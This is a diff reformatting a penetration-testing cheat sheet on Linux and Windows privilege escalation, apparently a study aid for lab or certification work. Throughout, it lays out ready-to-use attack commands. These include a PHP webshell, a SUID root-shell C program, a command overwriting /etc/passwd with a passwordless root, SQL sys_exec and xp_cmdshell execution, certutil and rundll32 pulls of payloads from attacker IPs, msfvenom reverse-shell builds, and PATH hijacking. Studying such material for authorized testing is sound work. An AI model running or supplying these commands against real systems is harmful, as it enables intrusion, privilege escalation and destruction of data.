@@ -470,28 +470,28 @@ Bash History is also good to read through
 Thoroughly enumerate User folders -   ```/home/bob/```   ```C:\Users\Bob```
 
 #### Other Services
-Database - is MySQL running as root? 
+- Database - is MySQL running as root? 
 
-```select sys_exec('usermod -a -G admin john');```
+  - ```select sys_exec('usermod -a -G admin john');```
 
-https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
+    - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
 
-https://www.exploit-db.com/exploits/1518 (linux)
+    - https://www.exploit-db.com/exploits/1518 (linux)
 
-https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/
+    - https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/
 
 
-If running third-party FTP, SMTP or service-named machine, maybe check those folders out..
+- If running third-party FTP, SMTP or service-named machine, maybe check those folders out..
 
-Look for ```.conf``` , ```.ini``` and passwd files.
+- Look for ```.conf``` , ```.ini``` and passwd files.
 
 #### Scripts
-Windows
-https://github.com/M4ximuss/Powerless
-https://github.com/GDSSecurity/Windows-Exploit-Suggester
+- Windows
+  - https://github.com/M4ximuss/Powerless
+  - https://github.com/GDSSecurity/Windows-Exploit-Suggester
 
-Linux
-https://github.com/sleventyeleven/linuxprivchecker/
+- Linux
+  - https://github.com/sleventyeleven/linuxprivchecker/
 
 # Priv-Esc (Windows) Check-List
 #### Basic System Information
@@ -632,39 +632,66 @@ lsb_release –a (Debian)
 ```
 
 #### Current user and privileges
-- id
-- pwd
-- sudo -l
+```
+id
+pwd
+sudo -l
+```
+
 #### Find SUID files that are world-writable (or cronjob)
-- find / -perm -u=s -type f 2>/dev/null
-- find / -perm -g=s -type f 2>/dev/null
-■ SUID Directory Traversal PATH=/exploit/code/path/$exploit
+```find / -perm -u=s -type f 2>/dev/null```
+```find / -perm -g=s -type f 2>/dev/null```
+
+SUID Directory Traversal: ```PATH=/exploit/code/path/$exploit```
 
 #### Find cronjob files that are world-writable
 
-- cat /etc/crontab & /etc/cron.d & /etc/*cron*
-- find / -perm -2 -type f 2>/dev/null
-■ gcc -o /tmp/setsuid /tmp/setsuid.c
-■ chmod u+s setsuid
+```cat /etc/crontab & /etc/cron.d & /etc/*cron*```
+
+```find / -perm -2 -type f 2>/dev/null```
+
+```
+gcc -o /tmp/setsuid /tmp/setsuid.c
+chmod u+s setsuid
+```
+
+
 #### Look for privileged NFS Mounts
-- Cat /etc/exports
+
+```cat /etc/exports```
+
 - Writable Mountpoint: Mount to folder, copy compiled SUID.c to folder, chmod u+s, run.
-- showmount -e 192.168.1.101
-- mount 192.168.1.101:/ /tmp/
-- Often SUID C binary files are required to spawn a shell as a superuser, you can update
-the UID / GID and shell as required..
+
+```
+showmount -e 192.168.1.101
+mount 192.168.1.101:/ /tmp/
+```
+
+- Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required..
+
+```nano suid.c```:
+
+```
 int main(void){
 setresuid(0, 0, 0);
 system("/bin/bash");
 }
-gcc -o suid suid.c
+```
+
+```gcc -o suid suid.c```
+
 #### What users are on the machine?
-- cat /etc/passwd
-■ echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd
-- grep –vE “nologin|false” /etc/passwd
+```cat /etc/passwd
+echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd
+grep –vE “nologin|false” /etc/passwd
+```
+
 #### What processes are currently running?
-- ps aux | grep root
-- netstat –antup
+```
+ps aux | grep root
+netstat –antup
+```
+
 #### Scripts:-
 - https://github.com/sleventyeleven/linuxprivchecker/
 - https://github.com/mzet-/linux-exploit-suggester
@@ -677,22 +704,26 @@ gcc -o suid suid.c
 ``` Dir C:\Windows /S *cmd*```
 ``` Dir C:\Windows\System32 /Q | find “BOB”```
 
-msfvenom formats
+#### msfvenom formats
 ``` exe, elf, c```
 ``` python, perl, asp, JavaScript, war```
 ``` js_le, (javascript, little endian)```
-Webshells
+
+#### Webshells
 ``` /usr/share/webshells/```
 ``` Pikachu.gif.php```
 ``` <? php echo system($_REQUEST['cmd']); ?>```
 
-Reverse-shell One-liners
-
-#### http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+#### Reverse-shell One-liners
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 - Try first, then last, then 2,3,4...
-- whereis netcat | which nc
 
-# Windows Transfer
+```
+whereis netcat
+which nc
+```
+
+#### Windows Transfer
 ``` certutil.exe -urlcache -split -f "http://10.10.14.19/accesschk.exe" achk.exe```
 ``` Smbserver.py leshare . → Copy \\10.10.14.19\leshare\accesschk.exe```
 
@@ -702,44 +733,52 @@ https://www.abatchy.com/2017/03/powershell-download-file-one-liners
 
 ``` Invoke-WebRequest "http://10.11.0.130/adfsys.exe" -OutFile "adfsys.exe"```
 
-# Windows Tricks
+
 #### SMB Server
-- smbserver.py leshare /var/www/html
-■ Copy \\10.10.12.84\leshare\scripts\Powerless.bat
-■ \\10.10.12.84\leshare\exploits\Windows\MS14.exe
-■ Rundll32.exe \\10.10.12.84\leshare\go.dll,0
+```smbserver.py leshare /var/www/html```
 
-# Python PSExec (and more at /usr/share/impacket)
-- psexec.py user:passwd@10.10.10.152 whoami
-- psexec.py user:passwd@10.10.10.152 -c python <cmd>
+```
+Copy \\10.10.12.84\leshare\scripts\Powerless.bat
+\\10.10.12.84\leshare\exploits\Windows\MS14.exe
+Rundll32.exe \\10.10.12.84\leshare\go.dll,0
+```
 
-# msfvenom payloads
-``` msfvenom -l payloads
-``` msfvenom -p java/jsp_shell_reverse_tcp --payload-options
-``` msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war
-> runme.war
-Useful file Locations
-Webshell locations:
-``` /usr/share/webshells
+#### Python PSExec (and more at /usr/share/impacket)
+```
+psexec.py user:passwd@10.10.10.152 whoami
+psexec.py user:passwd@10.10.10.152 -c python <cmd>
+```
 
-# Password lists:
-``` /usr/share/wordlists/fasttrack.txt (222)
-``` /usr/share/wordlists/dirb/small.txt (900)
-``` /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt (1244)
-``` /usr/share/seclists/Passwords/probable-v2-top(207-12000)
-``` /usr/share/wordlists/dirb/common.txt (4614)
-``` /usr/share/wordlists/nmap.lst (5084)
-``` /usr/share/wordlists/metasploit/password.lst (88396)
-Directory lists:
-``` /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-``` /usr/share/seclists/Discovery/Web-Content/common.txt
-``` /usr/share/seclists/Discovery/Web-Content/quickhits.txt
-``` /usr/share/seclists/Discovery/Web-Content/CGIs.txt
-``` /usr/share/seclists/Discovery/Web-Content/raft-*
-Fuzzing lists:
-``` /usr/share/seclists/Fuzzing
-``` /usr/share/wfuzz/wordlist
-Shell Spawning
+#### msfvenom payloads
+``` 
+msfvenom -l payloads
+msfvenom -p java/jsp_shell_reverse_tcp --payload-options
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war > runme.war
+```
+
+# Useful file Locations
+#### Webshell locations:
+``` /usr/share/webshells ```
+
+#### Password lists:
+``` /usr/share/wordlists/fasttrack.txt``` (222) 
+``` /usr/share/wordlists/dirb/small.txt``` (900)
+``` /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt``` (1244)
+``` /usr/share/seclists/Passwords/probable-v2-top``` (207-12000)
+``` /usr/share/wordlists/dirb/common.txt``` (4614)
+``` /usr/share/wordlists/nmap.lst``` (5084)
+``` /usr/share/wordlists/metasploit/password.lst``` (88396)
+#### Directory lists:
+``` /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```
+``` /usr/share/seclists/Discovery/Web-Content/common.txt```
+``` /usr/share/seclists/Discovery/Web-Content/quickhits.txt```
+``` /usr/share/seclists/Discovery/Web-Content/CGIs.txt```
+``` /usr/share/seclists/Discovery/Web-Content/raft-*```
+#### Fuzzing lists:
+``` /usr/share/seclists/Fuzzing```
+``` /usr/share/wfuzz/wordlist```
+
+#### Shell Spawning
 which python; which python3
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 Ctrl+Z
@@ -755,6 +794,7 @@ ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
 
 #### SUID Privileged Binaries
+```
 cp,mv: replace /etc/passwd to add a user or SSH key.
 less,more: !bash
 man man: !bash
@@ -766,8 +806,9 @@ exec "/bin/sh" (IRB)
 :!bash (vi)
 :set shell=/bin/bash:shell (vi)
 !sh (nmap)
+```
 
-Custom code running other binaries - PATH manipulation:
+#### Custom code running other binaries - PATH manipulation:
 If you are running a SUID which executes a shared binary (e.g., cat), we can manipulate the PATH variable to run
 our own file which we call cat.
 echo “/bin/bash” > /tmp/cat
@@ -775,11 +816,12 @@ chmod +x /tmp/cast
 export PATH=/tmp:$PATH
 ./runcatSUID
 
-  Another trick is to create a reverse shell with msfvenom and place that in the set PATH
+#### Another trick is to create a reverse shell with msfvenom and place that in the set PATH
 (msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.223 LPORT=555 -f elf -o shell)
 Execute OS Commands from within SQL
 
- SQL:
+
+#### SQL:
 \! whoami
 sys_exec('chown john.john /etc/shadow')
 SELECT sys_exec("net users lecon lecon /add");
@@ -787,7 +829,7 @@ MSSQL:
 EXEC xp_cmdshell 'dir *.exe';
 GO
   
-If your stuck:
+# If your stuck:
 #### Vector
 - Enumerate more... FROM THE TOP, do NOT SKIP ANY STEPS!!
 - When enumerating use more than one wordlist! (i.e., gobuster); also -
